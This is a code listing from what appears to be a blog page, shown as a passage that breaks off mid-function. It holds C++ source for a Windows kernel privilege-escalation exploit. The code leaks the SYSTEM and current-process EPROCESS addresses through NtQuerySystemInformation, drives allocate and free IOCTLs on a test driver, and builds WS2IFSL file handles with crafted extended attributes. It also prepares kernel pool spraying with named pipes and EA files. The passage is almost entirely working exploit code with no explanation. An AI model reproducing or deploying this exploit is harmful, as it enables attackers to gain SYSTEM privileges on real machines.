class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Device </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE            <span class="string">L&quot;\\\\.\\IoctlTest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE32  0x9C402400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE32   0x9C402408</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_ALLOCATE64  0x9C402404</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_RELEASE64   0x9C40240C</span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate64</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//wprintf(L&quot;[+] Allocate64\r\n&quot;);</span></span><br><span class="line">BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE szOutBuffer[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">*(PULONG)szInbuffer = uSize;</span><br><span class="line">DWORD dwBytesReturned;</span><br><span class="line">BOOL ret = FALSE;</span><br><span class="line">ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">g_hDevice, </span><br><span class="line">IOCTL_ALLOCATE64, </span><br><span class="line">szInbuffer, <span class="built_in">sizeof</span>(szInbuffer), </span><br><span class="line">szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer), </span><br><span class="line">&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE64\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Allocate32</span><span class="params">(ULONG uSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//wprintf(L&quot;[+] Allocate32\r\n&quot;);</span></span><br><span class="line">BYTE szInbuffer[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BYTE szOutBuffer[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">*(PULONG)szInbuffer = uSize;</span><br><span class="line">DWORD dwBytesReturned;</span><br><span class="line">BOOL ret = FALSE;</span><br><span class="line">ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">g_hDevice,</span><br><span class="line">IOCTL_ALLOCATE32,</span><br><span class="line">szInbuffer, <span class="built_in">sizeof</span>(szInbuffer),</span><br><span class="line">szOutBuffer, <span class="built_in">sizeof</span>(szOutBuffer),</span><br><span class="line">&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error IOCTL_ALLOCATE32\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (!ulInputBufferLength || !ulOutputBufferLength)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v3 = 0xC000000D;</span></span><br><span class="line"><span class="comment">//goto LABEL_34;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function">VOID <span class="title">Free64</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//wprintf(L&quot;[+] Free64\r\n&quot;);</span></span><br><span class="line">BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">BOOL ret = FALSE;</span><br><span class="line">DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line"> g_hDevice, </span><br><span class="line">IOCTL_RELEASE64, </span><br><span class="line">buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">buffer, <span class="built_in">sizeof</span>(buffer), </span><br><span class="line">&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE64\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wprintf(L&quot;first free succeeded, dwOutput = %d\n&quot;, dwOutput);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Free32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//wprintf(L&quot;[+] Free32\r\n&quot;);</span></span><br><span class="line">BYTE buffer[] = <span class="string">&quot;h5&quot;</span>;</span><br><span class="line">BOOL ret = FALSE;</span><br><span class="line">DWORD dwBytesReturned = <span class="number">0</span>;</span><br><span class="line">ret = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">g_hDevice,</span><br><span class="line">IOCTL_RELEASE32,</span><br><span class="line">buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">buffer, <span class="built_in">sizeof</span>(buffer),</span><br><span class="line">&amp;dwBytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == ret)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;Error IOCTL_RELEASE32\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get Kernel Infomation</span></span><br><span class="line">ULONG64   g_SystemEprocess;</span><br><span class="line">ULONG64   g_CurrentEprocess;</span><br><span class="line">ULONG64   g_ExploitEthread;</span><br><span class="line"></span><br><span class="line">HANDLE    g_ThreadExploitHandle;</span><br><span class="line">DWORD     g_CurrentPid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NtQuerySystemInfomation Leak Information</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_TABLE_ENTRY_INFO</span> &#123;</span><br><span class="line">USHORT UniqueProcessId;</span><br><span class="line">USHORT CreatorBackTraceIndex;</span><br><span class="line">UCHAR ObjectTypeIndex;</span><br><span class="line">UCHAR HandleAttributes;</span><br><span class="line">USHORT HandleValue;</span><br><span class="line">PVOID Object;</span><br><span class="line">ULONG GrantedAccess;</span><br><span class="line">LONG __PADDING__[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION</span> &#123;</span><br><span class="line">ULONG NumberOfHandles;</span><br><span class="line">SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemModuleInformation(SYSTEM_INFORMATION_CLASS)0x0b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation(SYSTEM_INFORMATION_CLASS)0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">LeakByQuerySystemInfomation</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD CurPid = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">g_CurrentPid = CurPid;</span><br><span class="line"><span class="comment">// Process</span></span><br><span class="line">HANDLE hSelf = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, <span class="number">0</span>, CurPid);</span><br><span class="line"><span class="keyword">if</span> (hSelf == INVALID_HANDLE_VALUE || hSelf == <span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error OpenProcess\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kthread and ktoken</span></span><br><span class="line">PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">ULONG OutBufLen = <span class="number">0</span>;</span><br><span class="line">NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, <span class="number">0x100</span>, &amp;OutBufLen);</span><br><span class="line"><span class="keyword">if</span> (status == STATUS_INFO_LENGTH_MISMATCH) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(HandleInfo);</span><br><span class="line">HandleInfo = (SYSTEM_HANDLE_INFORMATION*)<span class="built_in">malloc</span>(OutBufLen);</span><br><span class="line">status = <span class="built_in">NtQuerySystemInformation</span>(SystemHandleInformation, HandleInfo, OutBufLen, &amp;OutBufLen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (HandleInfo == <span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtQuerySystemInformation SystemHandleInformation\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PID  Handle </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line"><span class="keyword">if</span> (handleInfo.UniqueProcessId == CurPid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] PID %d\tObject %#llx\n&quot;</span>, handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  ExploitThread ETHREAD</span></span><br><span class="line"><span class="comment">// System EPROCESS</span></span><br><span class="line"><span class="comment">//  EPROCESS</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; HandleInfo-&gt;NumberOfHandles; i++) </span><br><span class="line">&#123;</span><br><span class="line">SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo-&gt;Handles[i];</span><br><span class="line"><span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)</span><br><span class="line">&#123;</span><br><span class="line">g_ExploitEthread = (ULONG64)HandleEntry.Object;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  Eprocess</span></span><br><span class="line"><span class="keyword">if</span> (HandleEntry.UniqueProcessId == CurPid &amp;&amp; HandleEntry.HandleValue == (ULONG)hSelf) </span><br><span class="line">&#123;</span><br><span class="line">g_CurrentEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n&quot;</span>, HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// System  Eprocess</span></span><br><span class="line"><span class="keyword">if</span> (HandleEntry.UniqueProcessId == <span class="number">0x4</span> &amp;&amp; HandleEntry.HandleValue == <span class="number">0x4</span>) </span><br><span class="line">&#123; <span class="comment">// SYSTEM Process has a handle to itself</span></span><br><span class="line">g_SystemEprocess = (ULONG64)HandleEntry.Object;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] System _EPROCESS: 0x%llx\r\n&quot;</span>, g_SystemEprocess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (g_ExploitEthread != <span class="number">0</span> &amp;&amp; g_CurrentEprocess != <span class="number">0</span> &amp;&amp; g_SystemEprocess) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(HandleInfo);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Get kthread and ktoken</span></span><br><span class="line"><span class="keyword">if</span> (g_ExploitEthread == <span class="number">0</span> || g_CurrentEprocess == <span class="number">0</span> || g_SystemEprocess == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error Leak\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ws2ifsl</span></span><br><span class="line"><span class="comment">// wdm.h</span></span><br><span class="line"><span class="comment">//  (EA) </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">ULONG NextEntryOffset;</span><br><span class="line">UCHAR Flags;</span><br><span class="line">UCHAR EaNameLength;</span><br><span class="line">USHORT EaValueLength;</span><br><span class="line">CHAR EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROC_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE ApcThread;          <span class="comment">// 0x00</span></span><br><span class="line">PVOID RequestQueueRoutine; <span class="comment">// 0x04</span></span><br><span class="line">PVOID CancelQueueRoutine;  <span class="comment">// 0x08</span></span><br><span class="line">PVOID ApcContext;          <span class="comment">// 0x0C</span></span><br><span class="line">PVOID unknown3;            <span class="comment">// 0x10</span></span><br><span class="line">&#125; PROC_DATA, * PPROC_DATA;</span><br><span class="line"></span><br><span class="line">HANDLE g_ThreadApcHandle;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray Ws2P</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayWs2P      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray NpFr</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayPipe      = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spray tag IO</span></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayEaFile    = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set to cpu number later</span></span><br><span class="line">DWORD CountConcurrentSprayEaFile  = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> ULONG64 CountSprayMm        = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ws2P Process</span></span><br><span class="line">HANDLE* g_ProcessList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateProcessFileHandle</span><span class="params">(HANDLE hThreadApc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UNICODE_STRING deviceName;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;deviceName, (PWSTR)<span class="string">L&quot;\\Device\\WS2IFSL\\NifsPvd&quot;</span>);</span><br><span class="line"></span><br><span class="line">OBJECT_ATTRIBUTES object;</span><br><span class="line"><span class="built_in">InitializeObjectAttributes</span>(&amp;object, &amp;deviceName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">PFILE_FULL_EA_INFORMATION pFileEa =</span><br><span class="line">(PFILE_FULL_EA_INFORMATION)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pFileEa == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;Error malloc\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pFileEa-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">pFileEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">pFileEa-&gt;EaNameLength = <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">pFileEa-&gt;EaValueLength = <span class="built_in">sizeof</span>(PROC_DATA);</span><br><span class="line"><span class="built_in">memcpy</span>(pFileEa-&gt;EaName, <span class="string">&quot;NifsPvd&quot;</span>, pFileEa-&gt;EaNameLength + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">PPROC_DATA pProcData = (PPROC_DATA)((<span class="type">char</span>*)pFileEa + <span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) - <span class="number">4</span>);</span><br><span class="line">pProcData-&gt;ApcThread = hThreadApc;</span><br><span class="line">pProcData-&gt;RequestQueueRoutine = (PVOID)<span class="number">0xaaaaaaaa</span>;</span><br><span class="line">pProcData-&gt;CancelQueueRoutine = (PVOID)<span class="number">0xbbbbbbbb</span>;</span><br><span class="line">pProcData-&gt;ApcContext = (PVOID)<span class="number">0xcccccccc</span>;</span><br><span class="line">pProcData-&gt;unknown3 = (PVOID)<span class="number">0xdddddddd</span>;</span><br><span class="line"></span><br><span class="line">HANDLE handle = INVALID_HANDLE_VALUE;</span><br><span class="line">IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line"><span class="comment">// object -&gt; handle</span></span><br><span class="line">NTSTATUS status = <span class="built_in">NtCreateFile</span>(</span><br><span class="line">&amp;handle, </span><br><span class="line">MAXIMUM_ALLOWED, </span><br><span class="line">&amp;object, </span><br><span class="line">&amp;IoStatusBlock, </span><br><span class="line"><span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, </span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pFileEa,</span><br><span class="line"><span class="built_in">sizeof</span>(FILE_FULL_EA_INFORMATION) + <span class="built_in">sizeof</span>(<span class="string">&quot;NifsPvd&quot;</span>) + <span class="built_in">sizeof</span>(PROC_DATA)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_ERROR</span>(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtCreateFile\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(pFileEa);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(pFileEa);</span><br><span class="line"><span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io Pool</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">APCThread</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NpFr</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PIPE_HANDLES</span> &#123;</span><br><span class="line">HANDLE r;</span><br><span class="line">HANDLE w;</span><br><span class="line">&#125; PIPE_HANDLES;</span><br><span class="line"></span><br><span class="line">std::vector&lt;PIPE_HANDLES&gt; g_Pipe;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SprayPipe</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr 